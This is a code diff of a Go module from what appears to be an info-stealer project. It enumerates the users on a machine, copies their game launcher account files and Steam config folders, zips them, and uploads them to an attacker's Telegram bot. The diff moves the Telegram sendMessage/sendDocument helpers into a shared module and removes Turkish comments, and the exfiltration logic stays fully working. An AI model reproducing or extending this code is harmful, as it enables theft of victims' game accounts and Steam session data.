@@ -1,4 +1,4 @@
-﻿package games
+package games
 
 import (
 	"fmt"
@@ -6,78 +6,10 @@ import (
 	"path/filepath"
 	"strings"
 
-	"github.com/benzoXdev/oxil/utils/fileutil"
-	"github.com/benzoXdev/oxil/utils/hardware"
+	"oxilreforged/modules/telegram"
+	"oxilreforged/utils/fileutil"
+	"oxilreforged/utils/hardware"
 )
-
-// Telegram yardımcı fonksiyonları (diğer modüllerden aynı)
-func sendTextToTelegram(botToken, chatID, text string) error {
-	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
-
-	payload := map[string]string{
-		"chat_id":    chatID,
-		"text":       text,
-		"parse_mode": "Markdown",
-	}
-
-	jsonData, _ := json.Marshal(payload)
-	resp, err := http.Post(url, "application/json", strings.NewReader(string(jsonData)))
-	if err != nil {
-		return err
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != 200 {
-		return fmt.Errorf("sendMessage failed: %d", resp.StatusCode)
-	}
-	return nil
-}
-
-func sendZipToTelegram(botToken, chatID, caption, zipPath string) error {
-	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botToken)
-
-	body := &bytes.Buffer{}
-	writer := multipart.NewWriter(body)
-
-	writer.WriteField("chat_id", chatID)
-	writer.WriteField("caption", caption)
-	writer.WriteField("parse_mode", "Markdown")
-
-	fileWriter, err := writer.CreateFormFile("document", filepath.Base(zipPath))
-	if err != nil {
-		return err
-	}
-
-	file, err := os.Open(zipPath)
-	if err != nil {
-		return err
-	}
-	defer file.Close()
-
-	_, err = io.Copy(fileWriter, file)
-	if err != nil {
-		return err
-	}
-
-	writer.Close()
-
-	req, _ := http.NewRequest("POST", url, body)
-	req.Header.Set("Content-Type", writer.FormDataContentType())
-
-	client := &http.Client{}
-	resp, err := client.Do(req)
-	if err != nil {
-		return err
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != 200 {
-		bodyBytes, _ := io.ReadAll(resp.Body)
-		return fmt.Errorf("sendDocument failed: %d - %s", resp.StatusCode, string(bodyBytes))
-	}
-
-	return nil
-}
 
 func Run(botToken string, chatID string) {
 	users := hardware.GetUsers()
@@ -137,11 +69,9 @@ func Run(botToken string, chatID string) {
 				var err error
 
 				if filepath.Ext(fPath) != "" {
-					// Dosya kopyala
 					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
 					err = fileutil.CopyFile(fPath, filepath.Join(destPath, filepath.Base(fPath)))
 				} else {
-					// Klasör kopyala
 					err = fileutil.CopyDir(fPath, destPath)
 				}
 
@@ -160,7 +90,6 @@ func Run(botToken string, chatID string) {
 			continue
 		}
 
-		// Metin mesajı
 		message := fmt.Sprintf(
 			"*🎮 Oyun Hesapları Bulundu - %s*\n\n"+
 				"```%s```",
@@ -168,9 +97,8 @@ func Run(botToken string, chatID string) {
 			found,
 		)
 
-		_ = sendTextToTelegram(botToken, chatID, message)
+		_ = telegram.SendTextToTelegram(botToken, chatID, message)
 
-		// ZIP oluştur ve gönder
 		tempZip := filepath.Join(os.TempDir(), fmt.Sprintf("games-%s.zip", username))
 		if err := fileutil.Zip(tempDir, tempZip); err != nil {
 			os.RemoveAll(tempDir)
@@ -178,13 +106,13 @@ func Run(botToken string, chatID string) {
 		}
 
 		caption := fmt.Sprintf("Oyun launcher dosyaları - %s", username)
-		_ = sendZipToTelegram(botToken, chatID, caption, tempZip)
+		_ = telegram.SendZipToTelegram(botToken, chatID, caption, tempZip)
 
 		os.Remove(tempZip)
 		os.RemoveAll(tempDir)
 	}
 
-	// Steam kısmı ayrı
+	// Steam kısmı
 	steamTempDir := filepath.Join(os.TempDir(), "steam-temp")
 	os.MkdirAll(steamTempDir, os.ModePerm)
 	defer os.RemoveAll(steamTempDir)
@@ -204,11 +132,9 @@ func Run(botToken string, chatID string) {
 	}
 	defer os.Remove(steamZip)
 
-	// Steam metni
 	steamMessage := "*🎮 Steam Config Dosyaları Bulundu*\n\n`✅✅✅`"
-	_ = sendTextToTelegram(botToken, chatID, steamMessage)
+	_ = telegram.SendTextToTelegram(botToken, chatID, steamMessage)
 
-	// Steam ZIP'ini gönder
 	caption := "Steam config dosyaları (config klasörü)"
-	_ = sendZipToTelegram(botToken, chatID, caption, steamZip)
+	_ = telegram.SendZipToTelegram(botToken, chatID, caption, steamZip)
 }
